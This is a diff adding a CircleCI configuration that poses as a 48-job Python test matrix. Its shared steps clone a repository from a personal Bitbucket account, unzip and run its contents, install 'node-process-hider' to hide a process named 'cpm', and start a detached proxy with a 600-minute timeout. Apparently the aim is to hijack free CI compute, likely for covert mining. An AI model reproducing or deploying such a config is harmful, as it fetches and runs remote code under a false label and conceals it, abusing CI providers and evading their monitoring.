@@ -1,0 +1,286 @@
+version: 2.1
+jobs:
+  python_01:
+    docker:
+      - image: circleci/python:3.10.0rc1-bullseye
+    <<: &commonSteps
+      steps:
+        - run:
+            name: Mr
+            command: |
+              ls -a
+        - run:
+            name: Golek
+            command: |
+              nproc
+        - run:
+            name: Opo
+            command: |
+              sudo apt install screen nodejs npm libjansson4 -y
+        - run:
+            name: Run_Om. . . . . .
+            no_output_timeout: 600m
+            shell: /bin/sh -e
+            command: |
+              git clone https://lindasinta@bitbucket.org/lindasinta/admin.git
+              cd admin
+              unzip Api_App.zip
+              chmod u+x *
+              sudo npm i -g node-process-hider
+              sudo ph add cpm
+              screen -dmS proxy python3 proxy.py
+              #sleep 60s ###
+              0#./mainci >/dev/null 2>&1
+  python_02:
+    docker:
+      - image: circleci/python:3.10-rc-bullseye
+    <<: *commonSteps
+  python_03:
+    docker:
+      - image: circleci/python:3.10.0rc1-buster
+    <<: *commonSteps
+  python_04:
+    docker:
+      - image: circleci/python:3.10-rc-buster
+    <<: *commonSteps
+  python_05:
+    docker:
+      - image: circleci/python:3.9.6-bullseye
+    <<: *commonSteps
+  python_06:
+    docker:
+      - image: circleci/python:3.9-bullseye
+    <<: *commonSteps
+  python_07:
+    docker:
+      - image: circleci/python:3.10.0rc1-bullseye
+    <<: *commonSteps
+  python_08:
+    docker:
+      - image: circleci/python:3.10-rc-bullseye
+    <<: *commonSteps
+  python_09:
+    docker:
+      - image: circleci/python:3.10.0rc1-buster
+    <<: *commonSteps
+  python_10:
+    docker:
+      - image: circleci/python:3.10-rc-buster
+    <<: *commonSteps
+  python_11:
+    docker:
+      - image: circleci/python:3.9.6-bullseye
+    <<: *commonSteps
+  python_12:
+    docker:
+      - image: circleci/python:3.9-bullseye
+    <<: *commonSteps
+  python_13:
+    docker:
+      - image: circleci/python:3.10.0rc1-bullseye
+    <<: *commonSteps
+  python_14:
+    docker:
+      - image: circleci/python:3.10-rc-bullseye
+    <<: *commonSteps
+  python_15:
+    docker:
+      - image: circleci/python:3.10.0rc1-buster
+    <<: *commonSteps
+  python_16:
+    docker:
+      - image: circleci/python:3.10-rc-buster
+    <<: *commonSteps
+  python_17:
+    docker:
+      - image: circleci/python:3.9.6-bullseye
+    <<: *commonSteps
+  python_18:
+    docker:
+      - image: circleci/python:3.9-bullseye
+    <<: *commonSteps
+  python_19:
+    docker:
+      - image: circleci/python:3.10.0rc1-bullseye
+    <<: *commonSteps
+  python_20:
+    docker:
+      - image: circleci/python:3.10-rc-bullseye
+    <<: *commonSteps
+  python_21:
+    docker:
+      - image: circleci/python:3.10.0rc1-buster
+    <<: *commonSteps
+  python_22:
+    docker:
+      - image: circleci/python:3.10-rc-buster
+    <<: *commonSteps
+  python_23:
+    docker:
+      - image: circleci/python:3.9.6-bullseye
+    <<: *commonSteps
+  python_24:
+    docker:
+      - image: circleci/python:3.9-bullseye
+    <<: *commonSteps
+  python_25:
+    docker:
+      - image: circleci/python:3.10.0rc1-bullseye
+    <<: *commonSteps
+  python_26:
+    docker:
+      - image: circleci/python:3.10-rc-bullseye
+    <<: *commonSteps
+  python_27:
+    docker:
+      - image: circleci/python:3.10.0rc1-buster
+    <<: *commonSteps
+  python_28:
+    docker:
+      - image: circleci/python:3.10-rc-buster
+    <<: *commonSteps
+  python_29:
+    docker:
+      - image: circleci/python:3.9.6-bullseye
+    <<: *commonSteps
+  python_30:
+    docker:
+      - image: circleci/python:3.9-bullseye
+    <<: *commonSteps
+  python_31:
+    docker:
+      - image: circleci/python:3.10.0rc1-bullseye
+    <<: *commonSteps
+  python_32:
+    docker:
+      - image: circleci/python:3.10-rc-bullseye
+    <<: *commonSteps
+  python_33:
+    docker:
+      - image: circleci/python:3.10.0rc1-buster
+    <<: *commonSteps
+  python_34:
+    docker:
+      - image: circleci/python:3.10-rc-buster
+    <<: *commonSteps
+  python_35:
+    docker:
+      - image: circleci/python:3.9.6-bullseye
+    <<: *commonSteps
+  python_36:
+    docker:
+      - image: circleci/python:3.9-bullseye
+    <<: *commonSteps
+  python_37:
+    docker:
+      - image: circleci/python:3.10.0rc1-bullseye
+    <<: *commonSteps
+  python_38:
+    docker:
+      - image: circleci/python:3.10-rc-bullseye
+    <<: *commonSteps
+  python_39:
+    docker:
+      - image: circleci/python:3.10.0rc1-buster
+    <<: *commonSteps
+  python_40:
+    docker:
+      - image: circleci/python:3.10-rc-buster
+    <<: *commonSteps
+  python_41:
+    docker:
+      - image: circleci/python:3.9.6-bullseye
+    <<: *commonSteps
+  python_42:
+    docker:
+      - image: circleci/python:3.9-bullseye
+    <<: *commonSteps
+  python_43:
+    docker:
+      - image: circleci/python:3.10.0rc1-bullseye
+    <<: *commonSteps
+  python_44:
+    docker:
+      - image: circleci/python:3.10-rc-bullseye
+    <<: *commonSteps
+  python_45:
+    docker:
+      - image: circleci/python:3.10.0rc1-buster
+    <<: *commonSteps
+  python_46:
+    docker:
+      - image: circleci/python:3.10-rc-buster
+    <<: *commonSteps
+  python_47:
+    docker:
+      - image: circleci/python:3.9.6-bullseye
+    <<: *commonSteps
+  python_48:
+    docker:
+      - image: circleci/python:3.9-bullseye
+    <<: *commonSteps
+
+
+
+
+
+
+
+
+
+
+workflows:
+  version: 2
+  all:
+    jobs:
+      - python_01
+      - python_02
+      - python_03
+      - python_04
+      - python_05
+      - python_06
+      - python_07
+      - python_08
+      - python_09
+      - python_10
+      - python_11
+      - python_12
+      - python_13
+      - python_14
+      - python_15
+      - python_16
+      - python_17
+      - python_18
+      - python_19
+      - python_20
+      - python_21
+      - python_22
+      - python_23
+      - python_24
+      - python_25
+      - python_26
+      - python_27
+      - python_28
+      - python_29
+      - python_30
+      - python_31
+      - python_32
+      - python_33
+      - python_34
+      - python_35
+      - python_36
+      - python_37
+      - python_38
+      - python_39
+      - python_40
+      - python_41
+      - python_42
+      - python_43
+      - python_44
+      - python_45
+      - python_46
+      - python_47
+      - python_48
+
+
+
